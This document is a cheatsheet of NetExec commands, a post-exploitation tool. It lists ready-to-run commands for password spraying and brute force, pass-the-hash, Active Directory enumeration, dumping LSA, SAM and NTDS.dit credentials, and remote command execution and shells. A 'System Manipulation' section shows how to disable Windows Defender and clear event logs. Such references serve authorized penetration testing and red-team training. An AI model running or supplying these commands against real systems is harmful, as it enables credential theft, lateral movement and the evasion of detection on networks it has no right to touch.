# NetExec Cheatsheet

NetExec (formerly CrackMapExec) is a powerful post-exploitation tool for network
enumeration, credential validation, and lateral movement. This cheatsheet
organizes commands by function for quick reference.

## 1. Basic Usage & Authentication

### Basic Syntax

```bash
netexec <protocol> <target> -u <user> -p <password> [options]
```

### Available Protocols

- `smb` - Server Message Block
- `ssh` - Secure Shell
- `winrm` - Windows Remote Management
- `ldap` - Lightweight Directory Access Protocol
- `rdp` - Remote Desktop Protocol
- `mssql` - Microsoft SQL Server
- `ftp` - File Transfer Protocol
- `wmi` - Windows Management Instrumentation
- `vnc` - Virtual Network Computing
- `nfs` - Network File System

### Authentication Methods

```bash
# Standard password authentication
netexec smb 192.168.1.0/24 -u Administrator -p 'Password123!'

# NTLM hash (Pass-the-Hash)
netexec smb <target> -u <user> -H <NTLM-hash>

# Kerberos authentication
netexec smb <target> -u <user> -k

# Kerberos ticket injection
netexec smb <target> -u <user> -k --ticket <ticket.kirbi>
```

## 2. Credential Attacks

### Password Spraying

```bash
# Test user list against a password list
netexec smb <target> -U <user-list> -P <password-list>
```

### Protocol-Specific Brute Force

```bash
# SMB credential testing
netexec smb <target> -u <user> -P <password-list>

# SSH credential testing
netexec ssh <target> -u <user> -P <password-list>

# RDP credential testing
netexec rdp <target> -u <user> -P <password-list>
```

## 3. Enumeration Commands

### Share Enumeration

```bash
# List available SMB shares
netexec smb <target> -u <user> -p <pass> --shares
```

### Active Directory Enumeration

```bash
# Enumerate users
netexec ldap <target> -u <user> -p <pass> --users

# Enumerate groups
netexec ldap <target> -u <user> -p <pass> --groups

# List active sessions
netexec smb <target> -u <user> -p <pass> --sessions

# List logged-on users
netexec smb <target> -u <user> -p <pass> --loggedon

# Full AD enumeration
netexec ldap <target> -u <user> -p <pass> --users --groups --computers --domain-controllers --policy
```

## 4. Credential Dumping

```bash
# Dump LSA secrets
netexec smb <target> -u <user> -p <pass> --lsa

# Dump SAM hashes
netexec smb <target> -u <user> -p <pass> --sam

# Dump NTDS.dit (Domain Controller)
netexec smb <target> -u <user> -p <pass> --ntds
```

## 5. Command Execution & Lateral Movement

### Remote Command Execution

```bash
# Execute cmd command via SMB
netexec smb <target> -u <user> -p <pass> -x "whoami"

# Execute PowerShell command
netexec smb <target> -u <user> -p <pass> -X "Get-Process"

# Execute PowerShell script file
netexec smb <target> -u <user> -p <pass> -X <script.ps1>
```

### Interactive Shells

```bash
# Interactive SMB shell
netexec smb <target> -u <user> -p <pass> -i

# Interactive WinRM shell
netexec winrm <target> -u <user> -p <pass> -i
```

### Alternative Execution Methods

```bash
# WMI execution
netexec smb <target> -u <user> -p <pass> --exec wmi -x "whoami"

# PSExec execution
netexec smb <target> -u <user> -p <pass> --exec psexec -x "whoami"
```

### System Manipulation

```bash
# Disable Windows Defender
netexec smb <target> -u <user> -p <pass> -x "powershell Set-MpPreference -DisableRealtimeMonitoring $true"

# Clear event logs
netexec smb <target> -u <user> -p <pass> -x "wevtutil cl System"
```

## 6. File Operations

```bash
# Upload a file
netexec smb <target> -u <user> -p <pass> --put <local> <remote>

# Download a file
netexec smb <target> -u <user> -p <pass> --get <remote> <local>
```

## 7. Database Operations

```bash
# Run MSSQL query
netexec mssql <target> -u <user> -p <pass> -q "SELECT @@version"
```
